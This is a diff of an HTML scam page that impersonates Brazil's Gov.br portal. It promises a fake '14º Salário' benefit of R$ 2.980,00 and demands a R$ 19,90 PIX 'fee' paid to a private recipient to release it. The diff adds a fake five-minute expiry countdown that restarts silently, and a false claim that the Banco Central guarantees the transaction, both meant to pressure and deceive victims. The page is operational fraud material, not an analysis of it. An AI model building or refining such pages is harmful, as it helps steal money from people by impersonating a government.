@@ -3,106 +3,107 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Portal Gov.br - Detalhamento de Benefício</title>
+    <title>Portal Gov.br - Finalizar Resgate</title>
     <style>
-        body { font-family: 'Rawline', sans-serif, Arial; background-color: #f2f5f7; margin: 0; padding: 0; color: #333; }
+        body { font-family: 'Arial', sans-serif; background-color: #f2f5f7; margin: 0; padding: 0; color: #333; }
         
-        /* Cabeçalho Padrão Gov */
         .gov-bar { background: #fff; padding: 12px 20px; border-bottom: 2px solid #004088; display: flex; align-items: center; justify-content: space-between; }
         .gov-bar img { height: 24px; }
 
-        .container { max-width: 550px; margin: 20px auto; padding: 10px; }
+        .container { max-width: 500px; margin: 15px auto; padding: 10px; }
 
-        /* Card de Informação */
-        .card { background: white; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); border-top: 5px solid #1d8032; padding: 25px; margin-bottom: 20px; }
+        /* Timer de Urgência */
+        .timer-box { background: #fff3cd; color: #856404; text-align: center; padding: 10px; border-radius: 8px; font-size: 13px; margin-bottom: 15px; border: 1px solid #ffeeba; }
+        .timer-box b { color: #d93025; }
+
+        .card { background: white; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); border-top: 6px solid #1d8032; padding: 20px; margin-bottom: 20px; }
         
-        .status-top { background: #e7f4e8; color: #1d8032; padding: 8px; border-radius: 4px; font-weight: bold; font-size: 13px; display: inline-block; margin-bottom: 15px; }
+        .status-top { background: #e7f4e8; color: #1d8032; padding: 6px 12px; border-radius: 20px; font-weight: bold; font-size: 11px; display: inline-block; margin-bottom: 15px; text-transform: uppercase; }
 
-        h1 { font-size: 18px; color: #004088; margin: 0 0 20px 0; border-bottom: 1px solid #eee; padding-bottom: 10px; }
+        h1 { font-size: 18px; color: #004088; margin: 0 0 15px 0; font-weight: 800; }
 
-        /* Estilo Extrato */
-        .extrato-table { width: 100%; border-collapse: collapse; margin-bottom: 20px; }
-        .extrato-table td { padding: 12px 0; border-bottom: 1px solid #f0f0f0; font-size: 14px; }
-        .extrato-table td.label { color: #666; }
-        .extrato-table td.value { text-align: right; font-weight: bold; }
+        .extrato-table { width: 100%; border-collapse: collapse; }
+        .extrato-table td { padding: 10px 0; border-bottom: 1px solid #f0f0f0; font-size: 13px; }
+        .extrato-table td.value { text-align: right; font-weight: bold; color: #004088; }
 
-        .total-box { background: #f8f9fa; padding: 20px; border-radius: 4px; text-align: center; border: 1px solid #ddd; }
-        .total-label { font-size: 12px; color: #555; display: block; }
-        .total-value { font-size: 32px; color: #1d8032; font-weight: 800; }
+        .total-box { background: #f8f9fa; padding: 15px; border-radius: 8px; text-align: center; margin-top: 15px; border: 1px solid #eee; }
+        .total-label { font-size: 11px; color: #666; display: block; text-transform: uppercase; font-weight: bold; }
+        .total-value { font-size: 28px; color: #1d8032; font-weight: 900; }
 
-        /* Área de Arrecadação (Pagamento) */
-        .payment-section { background: #fff; border: 1px solid #ddd; border-top: 5px solid #004088; border-radius: 4px; padding: 25px; }
-        .payment-title { font-size: 16px; font-weight: bold; color: #333; margin-bottom: 20px; display: flex; align-items: center; gap: 8px; }
+        /* Sessão de Pagamento Pique Banco */
+        .payment-section { background: #fff; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); border-top: 6px solid #1351b4; padding: 25px; }
+        .payment-title { font-size: 16px; font-weight: 800; color: #004088; margin-bottom: 15px; display: flex; align-items: center; gap: 8px; }
 
-        .tax-info { background: #fff9e6; border-left: 4px solid #ffcd07; padding: 15px; font-size: 13px; line-height: 1.5; margin-bottom: 25px; }
+        .tax-info { background: #f0f7ff; border-left: 4px solid #1351b4; padding: 15px; font-size: 13px; line-height: 1.5; margin-bottom: 20px; color: #004088; }
 
-        .qr-box { text-align: center; margin-bottom: 25px; }
-        .qr-box img { width: 200px; border: 1px solid #eee; padding: 10px; background: #fff; border-radius: 8px; }
+        .qr-box { text-align: center; margin-bottom: 20px; }
+        .qr-box img { width: 180px; border: 1px solid #ddd; padding: 8px; background: #fff; border-radius: 4px; }
 
         .pix-copy-box { text-align: center; }
-        .pix-input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; background: #f8f9fa; font-family: monospace; font-size: 11px; box-sizing: border-box; text-align: center; margin-bottom: 10px; }
+        .pix-input { width: 100%; padding: 14px; border: 1px solid #ced4da; border-radius: 8px; background: #f8f9fa; font-family: monospace; font-size: 10px; box-sizing: border-box; text-align: center; margin-bottom: 12px; color: #666; cursor: not-allowed; }
         
         .btn-copy { 
-            background: #1351b4; color: white; border: none; padding: 16px; width: 100%; 
-            border-radius: 50px; font-weight: bold; cursor: pointer; text-transform: uppercase; font-size: 14px; transition: 0.2s;
+            background: linear-gradient(180deg, #1351b4, #003366); color: white; border: none; padding: 18px; width: 100%; 
+            border-radius: 50px; font-weight: bold; cursor: pointer; text-transform: uppercase; font-size: 15px; box-shadow: 0 4px 10px rgba(19, 81, 180, 0.3); transition: 0.2s;
         }
-        .btn-copy:hover { background: #004088; }
+        .btn-copy:active { transform: scale(0.98); }
 
-        .footer-secure { text-align: center; margin-top: 30px; font-size: 11px; color: #999; }
+        .footer-secure { text-align: center; margin-top: 25px; font-size: 10px; color: #aaa; line-height: 1.5; }
     </style>
 </head>
 <body>
 
     <div class="gov-bar">
         <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/11/Gov.br_logo.svg/1200px-Gov.br_logo.svg.png" alt="Gov.br">
-        <span style="font-size: 11px; font-weight: bold; color: #666;">MINISTÉRIO DA FAZENDA</span>
+        <span style="font-size: 10px; font-weight: bold; color: #666;">PROTOCOLO SEGURO</span>
     </div>
 
     <div class="container">
         
+        <div class="timer-box">
+            Seu link de resgate expira em: <b id="timer">05:00</b>
+        </div>
+
         <div class="card">
-            <div class="status-top">✓ BENEFÍCIO PRONTO PARA ENVIO</div>
-            <h1>Extrato de Processamento</h1>
+            <div class="status-top">✓ Liberação Pendente</div>
+            <h1>Resumo do Benefício</h1>
             
             <table class="extrato-table">
                 <tr>
-                    <td class="label">Descrição do Abono:</td>
-                    <td class="value">14º Salário Emergencial</td>
+                    <td>Beneficiário:</td>
+                    <td class="value">CPF Identificado</td>
                 </tr>
                 <tr>
-                    <td class="label">Competência:</td>
-                    <td class="value">2025/2026</td>
+                    <td>Origem:</td>
+                    <td class="value">14º Salário Extra</td>
                 </tr>
                 <tr>
-                    <td class="label">Forma de Envio:</td>
+                    <td>Transferência:</td>
                     <td class="value">PIX Instantâneo</td>
                 </tr>
             </table>
 
             <div class="total-box">
-                <span class="total-label">VALOR LÍQUIDO DISPONÍVEL</span>
+                <span class="total-label">Valor a Receber</span>
                 <span class="total-value">R$ 2.980,00</span>
             </div>
         </div>
 
         <div class="payment-section">
-            <div class="payment-title">🏛️ Guia de Liberação Digital</div>
+            <div class="payment-title">📲 Finalizar Resgate via PIX</div>
             
             <div class="tax-info">
-                <strong>Instrução de Desbloqueio:</strong><br>
-                Para autorizar a transferência do valor acima, o segurado deve efetuar o pagamento da <b>Tarifa de Processamento Digital (TPD)</b> no valor de <b>R$ 19,90</b>.
+                Para liberar o depósito de <b>R$ 2.980,00</b>, efetue o pagamento da Tarifa de Emissão de Guia (TEG) no valor de <b>R$ 19,90</b>. O envio do seu benefício é feito automaticamente após a compensação.
             </div>
 
             <div class="qr-box">
-                <p style="font-size: 13px; font-weight: bold; margin-bottom: 15px;">Pague via PIX para liberação imediata:</p>
                 <img src="qrcode2.png" alt="QR Code PIX">
-                <p style="font-size: 11px; color: #666; margin-top: 10px;">Utilize o QR Code para pagar pelo Computador</p>
+                <p style="font-size: 11px; color: #888; margin-top: 8px;">Aponte a câmera para o QR Code</p>
             </div>
 
             <div class="pix-copy-box">
-                <p style="font-size: 12px; font-weight: bold; color: #666; margin-bottom: 8px;">OU COPIE O CÓDIGO ABAIXO :</p>
-                <input type="text" value="00020101021126580014br.gov.bcb.pix013695a60332-ee2f-4252-8ba7-76162b4eec3e520400005303986540519.905802BR5915RICHARD N BRAGA6008REGISTRO62070503***6304AD87
-" id="pixCode" readonly class="pix-input">
+                <p style="font-size: 11px; font-weight: bold; color: #444; margin-bottom: 8px;">COPIE E COLE NO APP DO SEU BANCO:</p>
+                <input type="text" value="00020101021126580014br.gov.bcb.pix013695a60332-ee2f-4252-8ba7-76162b4eec3e520400005303986540519.905802BR5915RICHARD N BRAGA6008REGISTRO62070503***6304AD87" id="pixCode" readonly class="pix-input">
                 
                 <button onclick="copiarPix()" id="btnCopiar" class="btn-copy">
                     Copiar Código PIX (R$ 19,90)
@@ -111,12 +112,13 @@
         </div>
 
         <div class="footer-secure">
-            🛡️ <b>Sistema de Pagamentos Integrado (SPI)</b><br>
-            Autenticado pelo Banco Central do Brasil.
+            🛡️ <b>Transação Garantida pelo Banco Central</b><br>
+            Ambiente Seguro - Criptografia SSL 256 bits
         </div>
     </div>
 
     <script>
+        // Função de Copiar
         function copiarPix() {
             var copyText = document.getElementById("pixCode");
             copyText.select();
@@ -129,14 +131,26 @@
             
             setTimeout(function(){
                 btn.innerHTML = "Copiar Código PIX (R$ 19,90)";
-                btn.style.background = "#1351b4";
+                btn.style.background = "linear-gradient(180deg, #1351b4, #003366)";
             }, 3000);
         }
+
+        // Timer de 5 minutos
+        function startTimer(duration, display) {
+            var timer = duration, minutes, seconds;
+            setInterval(function () {
+                minutes = parseInt(timer / 60, 10);
+                seconds = parseInt(timer % 60, 10);
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+                display.textContent = minutes + ":" + seconds;
+                if (--timer < 0) { timer = duration; }
+            }, 1000);
+        }
+        window.onload = function () {
+            startTimer(300, document.querySelector('#timer'));
+        };
     </script>
 
 </body>
-
 </html>
-
-
-
